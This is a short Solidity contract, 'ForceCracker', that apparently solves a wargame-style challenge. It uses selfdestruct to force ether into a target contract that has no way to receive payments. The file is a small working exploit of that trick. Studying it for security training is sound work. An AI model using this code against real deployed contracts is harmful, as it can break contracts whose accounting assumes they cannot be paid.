pragma solidity >=0.4.22 <0.9.0;

contract ForceCracker {
    address payable forcePayable;

    constructor(address payable _forceAddress) public {
        forcePayable = _forceAddress;
    }

    receive() external payable {}

    function payByForce() public payable {
        selfdestruct(forcePayable);
    }
}
